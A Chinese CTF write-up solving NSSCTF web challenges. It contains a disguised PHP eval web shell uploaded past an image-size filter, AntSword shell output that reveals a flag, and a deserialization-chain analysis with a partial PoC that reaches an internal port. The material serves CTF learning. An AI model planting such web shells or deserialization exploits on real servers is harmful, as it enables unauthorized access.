<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$filetype</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$save_path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file type!image/jpeg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;welcome.jpg&quot;</span>)).<span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里就是对宽高做了限制，然后不允许php出现所以我们之前用&lt;?&#x3D;代替还是没错的，主要就是定义宽高<br>原来直接在文件里面定义就好了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define height 1</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
<p>成功上传！<br><img src="https://pic1.imgdb.cn/item/67b343ccd0e0a243d4004f14.png"><br><code>Cookie: PHPSESSID=nrd70psbefs9ma416hm6g3qfnc</code>所以我们的路径就在upload&#x2F;nrd70psbefs9ma416hm6g3qfnc&#x2F;2.php<br>蚁剑连接进来发现看不了根目录<br><img src="https://pic1.imgdb.cn/item/67b344dbd0e0a243d4004f48.png"><br>解决方法就是去蚁剑的虚拟终端里面去看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html/upload/nrd70psbefs9ma416hm6g3qfnc) $ cd /</span><br><span class="line">(www-data:/) $ ls -al</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 ..</span><br><span class="line">-rwxr-xr-x  <span class="number"> 1 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 .dockerenv</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>bin</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep <span class="number"> 3 </span><span class="number"> 2022 </span>boot</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root root <span class="number"> 340 </span>Feb<span class="number"> 17 </span>13:50 dev</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 etc</span><br><span class="line">-rwxrwxrwx  <span class="number"> 1 </span>root root  <span class="number"> 45 </span>Feb<span class="number"> 17 </span>13:50 flag</span><br><span class="line">-rwxrwxrwx  <span class="number"> 1 </span>root root  <span class="number"> 69 </span>Sep<span class="number"> 19 </span><span class="number"> 2022 </span>flag.sh</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep <span class="number"> 3 </span><span class="number"> 2022 </span>home</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>lib</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>lib64</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>media</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>mnt</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>opt</span><br><span class="line">dr-xr-xr-x<span class="number"> 290 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 proc</span><br><span class="line">drwx------  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>root</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>run</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>sbin</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>srv</span><br><span class="line">dr-xr-xr-x <span class="number"> 13 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 sys</span><br><span class="line">drwxrwxrwt  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>14:17 tmp</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>usr</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>var</span><br><span class="line">(www-data:/) $ cat flag</span><br><span class="line">NSSCTF&#123;a716da50-93a3-4f5e-8451-fff514e48cc1&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h1><p><img src="https://pic1.imgdb.cn/item/67b345cdd0e0a243d4004fb9.png"><br>查看源码里面中 有一句注释</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ?source= --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>随便输入一个文件之后，就给出源码<code>?source=/etc/passwd</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;hacker.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>我们看到最后有一个反序列化函数，所以这题是一个反序列化链的题目<br>先看刚才读取文件的逻辑在这句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$path</span>)&amp;&amp;!preg_match(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.base64_encode(file_get_contents(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>那就先读一下当前目录下的flag.php，然后查看源代码，发现在这个图片src中确实有base64加密过的信息 <code>?image_path=flag.php</code></p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:jpg;base64,PD9waHANCg0KJGEgPSAiZ29vZCBqb2IsYnV0IHRoZXJlIGlzIG5vIGZsYWcNCg0KaSBwdXQgbXkgZmxhZyBpbiBpbnRyYW5ldCgxMjcuMC4wLjE6NjU1MDApDQoNCm91dHNpZGVyIGhhdmUgbm8gcGVybWlzc2lvbnMgdG8gZ2V0IGl0DQoNCmlmIHlvdSB3YW50IGl0LHRoZW4geW91IGhhdmUgdG8gdGFrZSBpdA0KDQpidXQgeW91IGFscmVhZHkga25ldyB0aGUgcnVsZXMNCg0KdHJ5IGl0IjsNCg0KPz4=&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- ?source= --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-xml">└─# echo PD9waHANCg0KJGEgPSAiZ29vZCBqb2IsYnV0IHRoZXJlIGlzIG5vIGZsYWcNCg0KaSBwdXQgbXkgZmxhZyBpbiBpbnRyYW5ldCgxMjcuMC4wLjE6NjU1MDApDQoNCm91dHNpZGVyIGhhdmUgbm8gcGVybWlzc2lvbnMgdG8gZ2V0IGl0DQoNCmlmIHlvdSB3YW50IGl0LHRoZW4geW91IGhhdmUgdG8gdGFrZSBpdA0KDQpidXQgeW91IGFscmVhZHkga25ldyB0aGUgcnVsZXMNCg0KdHJ5IGl0IjsNCg0KPz4= | base64 -d</span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="variable">$a</span> = <span class="string">&quot;good job,but there is no flag</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">i put my flag in intranet(127.0.0.1:65500)</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">outsider have no permissions to get it</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">if you want it,then you have to take it</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">but you already knew the rules</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">try it&quot;</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml">                                                                                                                          </span></span><br></pre></td></tr></table></figure>
<p>这里告诉我们要读到flag就要在内网的65500端口访问才可以<br>那就继续从源码中找到反序列化链。<br>和之前碰到这种类型题目一致，不能直接输出flag就去找怎么才能执行命令，很快就可以找到是在FileViewer类中的<br><code>$file = $this-&gt;curl($this-&gt;local.$this-&gt;path);</code>这个命令就会去访问<code>$this-&gt;local</code>的<code>$this-&gt;path文件</code><br>这个在FileViewer类的<code>loadfile</code>函数中，然后找到同样这个类中的<code>_call($f,$a)</code>函数会执行loadfile函数，但是这个函数仅仅是在这个类里面，没有体现怎么执行<br>现在再去找能去执行这个函数的东西，看到<code>Backdoor</code>这个类，（这个名字就已经提示了）<br>这个类第一个函数<code>goodman</code>作用让第一个参数的第二个参数属性变成这个类中的<code>superhacker</code><br>第二个<code>__destruct()</code>魔法函数，先执行一下goodman函数，然后执行<code>$this-&gt;a-&gt;c()</code><br>那么关键就来了，我们就利用<code>$this-&gt;a-&gt;c()</code>去执行FileViewer中的<code>_call($f,$a)</code><br>那么完整的链是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">入口： Backdoor <span class="built_in">__destruct</span>()  </span><br><span class="line">调用 FileViewer <span class="built_in">_call</span>($f,$a) 跳到</span><br><span class="line">FileViewer loadfile</span><br></pre></td></tr></table></figure></div>
<p>在看如何去访问内网的127.0.0.1:65500&#x2F;flag<br>这里我们访问的路径是<code>$this-&gt;local</code>拼接上<code>$this-&gt;path</code>,过滤只针对<code>$this-&gt;path</code>，这里把<code>/flag</code>过滤了<br>那绕过很容易，只要把一部分放在<code>$this-&gt;local</code>就好了，也就是让<code>$this-&gt;local</code>为<code>127.0.0.1:65500/fl</code>这样<br>那对这个<code>$this-&gt;local</code>有限制的就是__wakeup()这个魔法函数，他会重置值<br>绕过也很容易，这个wakeup函数是在FileViewer类初始化的时候会执行的，我们只要用Backdoor类中的goodman方法就可以重新赋值，那其实也不用管了<br>那现在整理清思路，先写一个大致的poc</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span 